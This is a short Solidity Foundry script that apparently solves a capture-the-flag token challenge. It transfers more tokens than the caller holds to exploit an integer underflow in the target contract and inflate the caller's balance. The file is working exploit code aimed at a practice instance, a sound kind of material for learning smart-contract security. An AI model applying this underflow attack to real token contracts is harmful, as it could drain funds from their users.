// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";

contract TokenSolve is Script {
	function run() public {

		vm.startBroadcast();

		// Deploy attacker  
		address targetAddr = vm.envAddress("INSTANCE_ADDRESS");
		IToken target = IToken(targetAddr); 

		// Perform attack
		console2.log(
			"Our original balance", 
			target.balanceOf(msg.sender)
		);
		// targetAddr can be anyone but us. 
		// because the underflow will be cancel out with overflow
		bool success = target.transfer(targetAddr, 22);
		require(success, "Transaction failed");

		// verify
//		require(target.balanceOf(msg.sender) > 20, "Exploit Failed");
		console2.log("Success! our balance:", 
			target.balanceOf(msg.sender)
		);

		vm.stopBroadcast();
	}
}

interface IToken {
    function transfer(address _to, uint256 _value) external returns (bool);
    function balanceOf(address _owner) external view returns (uint256 balance); 
}
